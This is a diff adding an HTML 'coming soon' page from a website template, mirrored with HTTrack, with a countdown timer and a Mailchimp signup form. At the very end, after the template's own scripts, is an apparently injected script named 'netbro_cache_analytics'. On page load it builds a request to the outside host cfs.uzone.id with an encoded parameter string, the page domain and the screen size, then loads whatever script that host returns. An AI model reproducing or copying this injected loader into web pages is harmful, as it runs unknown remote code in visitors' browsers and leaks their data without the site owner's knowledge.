@@ -1,0 +1,359 @@
+<!doctype html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
+
+<!-- Mirrored from preview.uipro.net/tempo-v1.1/coming-soon.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 08 Jan 2017 07:11:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<title>tempo - An Ultimate Website Template</title>
+	<meta name="description" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="apple-touch-icon" href="apple-touch-icon.png">
+	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+	<style>
+		@import url("https://fonts.googleapis.com/css?family=Lora:400italic|Montserrat:400,700");
+        * {
+            line-height: 1.2;
+            margin: 0;
+        }
+		.preloader{
+			position:fixed;
+			top:0;
+			left:0;
+			width:100%;
+			height:100%;
+			background-color:#fff;
+			text-align:center;
+			z-index:100000;
+		}
+		.spinner-wrap{
+			position:absolute;
+			top:50%;
+			left:0;
+			height:30px;
+			width:100%;
+			margin-top:-15px;
+			text-align:center;
+		}
+        html {
+            color: #fff;
+            display: table;
+            font-family: sans-serif;
+            height: 100%;
+            text-align: center;
+            width: 100%;
+			background:url(img/bg/bg11.jpg) center center no-repeat;
+			background-size:cover;
+        }
+        body {
+			font-family:'Montserrat', Helvetica, sans-serif;
+            display: table-cell;
+            vertical-align: middle;
+            margin: 2em auto;
+			background-color:rgba(100, 100, 100, 0.4);
+        }
+        h1 {
+            color: #fff;
+            font-size: 78px;
+            font-weight: 700;
+			text-transform:uppercase;
+			margin-bottom:0.4em;
+        }		
+		h1 > small{
+			font-size:50%;
+			text-transform:none;
+			letter-spacing:0.3em;
+			display:block;
+			font-weight:400;
+			color:rgba(250, 250, 250, 0.5);
+			font-family:'Lora', Helvetica, sans-serif;
+		}
+        p {
+            margin: 15px auto;
+			font-size:17px;
+            width: 280px;
+        }		
+		img{
+			max-width:100%;
+			height:auto;
+		}		
+		a{
+			color:#fff;
+		}		
+		.countdown{
+			position:relative;
+			text-align:center;
+		}
+		.countdown > div{
+			display:inline-block;
+			font-size:58px;
+			font-weight:700;
+			margin:0 30px;
+		}
+		.countdown > div > span{
+			display:block;
+			font-size:50%;
+			font-weight:400;
+		}		
+		form{
+			margin:60px auto 0;	
+		}
+		.form-group{
+			position:relative;
+			margin:0 auto;
+			border-radius:2px;
+			background:rgba(0, 0, 0, 0.3);
+			width:60%;
+			max-width:600px;
+			text-align:left;
+		}
+		.form-group:after{
+			clear:both;
+		}
+		.form-group:after,
+		.form-group:before{
+			display:table;
+			content:'';
+		}
+		.input-col, .btn-col{
+			float:left;
+			box-sizing:border-box;
+			width:30%;
+		}
+		.input-col{
+			width:68%;
+			margin-right:2%;
+		}
+		label{
+			position:absolute;
+			top:-25px;
+			left:0;
+		}
+		.btn, .form-control{
+			width:100%;
+			box-sizing:border-box;
+			font-family:'Montserrat', Helvetica, sans-serif;
+		}
+		.btn{
+			font-size:17px;
+			color:#fff;
+			background:#F62459;
+			border:1px solid #F62459;
+			border-radius:2px;
+			padding:12px 12px;
+			cursor:pointer;
+			-webkit-transition: all 0.5s;
+			transition: all 0.5s;
+		}
+		.btn:hover,
+		.btn:focus{
+			color:#fff;
+			background-color:#000;
+			border-color:#000;
+		}
+		.form-control{
+			background-color:transparent;
+			border:0;
+			margin-left:20px;
+			height:48px;
+			border-radius:0;
+			font-size:20px;
+			font-weight:700;
+			color:#fff;
+		}
+		.subscription-success,
+		.subscription-error{
+			font-weight:400;
+			max-width:650px;
+			margin:20px auto;
+		}
+		.text-success{
+			color:#2ECC71;
+		}
+		.text-danger{
+			color:#E74C3C;
+		}
+		
+        @media only screen and (max-width: 767px) {
+
+            h1{
+				font-size:58px;
+			}
+			.countdown > div{
+				font-size:45px;
+				margin:0 20px;
+			}
+
+        }
+		
+        @media only screen and (max-width: 650px) {
+
+            h1{
+				font-size:48px;
+			}
+			.countdown > div{
+				font-size:36px;
+				margin:0 15px;
+			}
+			.input-col, .btn-col{
+				float:none;
+				width:100%;
+			}
+
+        }
+		
+        @media only screen and (max-width: 480px) {
+
+            h1{
+				font-size:36px;
+			}
+			.countdown > div{
+				font-size:28px;
+				margin:0 10px;
+			}
+			.form-group{
+				width:80%;
+			}
+			
+        }
+		
+        @media only screen and (max-width: 280px) {
+
+            body, p {
+                width: 95%;
+            }
+            h1 {
+                font-size: 1.5em;
+                margin: 0 0 0.3em;
+            }
+
+        }
+
+    </style>
+
+	<script src="js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
+	
+</head>
+<body>
+
+	<!--[if lt IE 8]>
+		<p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+	<![endif]-->
+	
+
+<!-- preloader START -->
+<div class="preloader">
+	<div class="spinner-wrap">
+		<div class="spinner spinner-wave">
+			<div class="rect1"></div>
+			<div class="rect2"></div>
+			<div class="rect3"></div>
+			<div class="rect4"></div>
+			<div class="rect5"></div>
+		</div>
+	</div>
+</div>
+<!-- preloader END -->
+
+<!-- section START -->
+<section class="inner-wrapper">
+
+	<h1><small>this website is </small>coming soon</h1>
+							
+	<!-- timer start -->
+	<div class="countdown" data-date="June 7, 2017 15:03:25"></div>
+	<!-- timer end -->	
+					
+	<!-- campaign monitor form tag -->
+	<!--<form class="subscription-form" role="form" id="campaign-monitor" action="http://oscodo1.createsend.com/t/t/s/hkdrul/" method="post">-->
+	
+	<!-- mailchimp form tag -->
+	<form class="subscription-form" role="form" id="mailchimp">
+		
+		<div class="form-group">
+			<div class="input-col">
+				<label class="sr-only" for="email">Email address</label>
+				<input type="email" class="form-control input-lg" id="email" name="cm-hkdrul-hkdrul" placeholder="email@domain.com">
+			</div>
+			<div class="btn-col">
+				<button type="submit" class="btn btn-success btn-lg btn-block">Subscribe</button>
+			</div>
+		</div>
+	
+		<!-- success and error messages -->
+		<h4 class="subscription-success"></h4>
+		<h4 class="subscription-error"></h4>
+		
+	</form>	
+	
+</section>
+<!-- section END -->
+       
+<!-- jQuery plugins -->
+<script src="js/vendor/jquery.js"></script>
+<script src="js/countdown.js"></script>
+<script src="js/ajaxchimp.js"></script>
+<script src="js/main.js"></script>
+	
+<script type="text/javascript">
+$(document).ready(function(){
+	
+	// preloader animation
+    $('.spinner-wrap').fadeOut();
+	$('.preloader').delay(500).fadeOut('slow');	
+	
+	//countdown timer
+	$('.countdown').countdown({
+	  render: function(data) {
+		$(this.el).html("<div>" + this.leadingZeros(data.days, 3) + " <span>days</span></div><div>" + this.leadingZeros(data.hours, 2) + " <span>hrs</span></div><div>" + this.leadingZeros(data.min, 2) + " <span>min</span></div><div>" + this.leadingZeros(data.sec, 2) + " <span>sec</span></div>");
+	  }
+	});
+	
+	// campaign monitor subscription
+	// form settings	
+	$(function () {
+		$('#campaign-monitor').on('submit', function (e) {
+			e.preventDefault();
+			$.getJSON(
+			this.action + "?callback=?",
+			$(this).serialize(),
+			function (data) {
+				if (data.Status === 400) {
+					alert("Error: " + data.Message);
+				} else { // 200
+					alert("Success: " + data.Message);
+				}
+			});
+		});
+	});
+	
+	// mailchimp settings	
+	$('#mailchimp').ajaxChimp({
+		callback: mailchimpCallback,
+		url: "http://oscodo.us9.list-manage.com/subscribe/post?u=aef5e76b30521b771cf866464&amp;id=f9f9e8db45"
+		//replace above url with your own mailchimp post url inside the "".
+		//to learn how to get your own URL, please check documentation file.
+	});	
+	function mailchimpCallback(resp) {
+		 if (resp.result === 'success') {
+			$('#mailchimp .subscription-success').html('<i class="icon_check_alt2"></i>' + resp.msg).fadeIn(1000);
+			$('#mailchimp .subscription-error').fadeOut(500);
+			
+		} else if(resp.result === 'error') {
+			$('#mailchimp .subscription-success').fadeOut(500);
+			$('#mailchimp .subscription-error').html('<i class="icon_close_alt2"></i>' + resp.msg).fadeIn(1000);
+		}  
+	}
+	
+});
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKjD1s7rMipeT7bfDijOb1jzrHAvu06i3yZNSteBCqcBIj6eZfb0Qf17zh1YTrYtI%2buC05I0%2fuYLuhxs9QsOrd1xThE3kd2jgtKoCRmgxiQhZzoLZm7cqTdcTHk29pJQgCMy3W7QZeb8sIiU3hiNUgsi9xf%2flzbizQaCnnSdxWyWY27PnDjP2eT64qxnncXFkedSIKzCzbe%2fFrwR50ho078c7oxBnNsRgVHGRRgdj5abeKRZs0q3xE0DdCIrsD1Kg88uoWKLJNEMiaHdksYZHioUqRbmadnSt5MkXpH6pdJwCowpoE5VWWnpX8R4LeFYVvbQ4yEx1Yt%2b24SgdVaxwRHBbsWAVFwtHt4L4br1B%2fdXLdpBvPDWCAw%2fu4iVeUi2fjZw7eJLu0kzvW9d6FLxmj49%2b7RuQUADuaXKa51AZ1sw5%2bjFqMXqezvXY%2bcpqZu0GUh0YIGJKXFjxfSaQcL6PRv4JkxgqcDReK0ApfOoaIxKoNsvFQ0RBdFw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from preview.uipro.net/tempo-v1.1/coming-soon.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 08 Jan 2017 07:11:45 GMT -->
+</html>
